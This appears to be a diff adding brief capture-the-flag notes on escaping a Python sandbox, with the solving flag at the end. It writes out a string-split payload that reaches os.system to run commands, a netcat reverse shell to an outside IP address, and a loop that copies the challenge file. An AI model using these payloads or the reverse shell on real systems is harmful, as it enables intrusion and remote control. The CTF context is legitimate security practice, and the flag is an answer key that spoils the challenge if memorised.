@@ -1,0 +1,18 @@
+jail bypass payload,
+vars(__builtins__)['__imp' + 'ort__']('o' + 's').__dict__['sys' + 'tem']('{command} 1>&2; cat flag')
+the program returned stderr to us, and cat flag... generates that error!
+
+simple rev shell using:
+nc 103.20.235.21 7777 -e sh
+
+socat was on the machine so go a stable shell using that!
+jumped around a bit, in /proc/pid/ but found nothing
+
+gdb wasn't attachable to the process!
+
+noticed that on every new connection, the file was being copied to /home/ctf
+
+go brr,
+while true; do cp /home/ctf/chall.py ./gg &>/dev/null; done &
+
+CyberErudites{cl34N1N9_7H3_94r8493_W17h_gC}
